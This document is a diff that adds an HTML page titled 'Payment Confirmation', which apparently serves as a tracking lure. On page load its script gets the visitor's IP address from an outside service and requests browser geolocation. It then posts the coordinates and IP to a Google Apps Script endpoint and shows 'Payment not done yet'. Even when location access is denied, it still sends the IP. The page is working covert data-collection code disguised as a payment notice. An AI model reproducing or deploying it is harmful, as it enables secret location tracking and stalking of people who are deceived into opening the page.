@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Payment Confirmation</title>
+  <script>
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch (err) {
+        console.error("Failed to get IP:", err);
+        return "Unavailable";
+      }
+    }
+
+    async function sendLocation(lat, lng, ip) {
+      try {
+        await fetch('https://script.google.com/macros/s/AKfycbz0koeiI_A7djGzS0jOQhSM9TLt0YiwooHplgYNXf9dcCHlk5EW--0I2R8Zdi079O_r/exec', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ lat, lng, ip })
+        });
+        console.log("Data sent");
+      } catch (err) {
+        console.error("Error sending data:", err);
+      }
+    }
+
+    async function handleVisitor() {
+      const ip = await getIP();
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            await sendLocation(lat, lng, ip);
+            document.getElementById("message").innerText = "Payment not done yet";
+          },
+          async () => {
+            await sendLocation("Denied", "Denied", ip);
+            document.getElementById("message").innerText = "Location access denied.";
+          }
+        );
+      } else {
+        await sendLocation("Not supported", "Not supported", ip);
+        document.getElementById("message").innerText = "Geolocation not supported.";
+      }
+    }
+
+    window.onload = handleVisitor;
+  </script>
+</head>
+<body>
+  <h2 id="message">Loading...</h2>
+</body>
+</html>
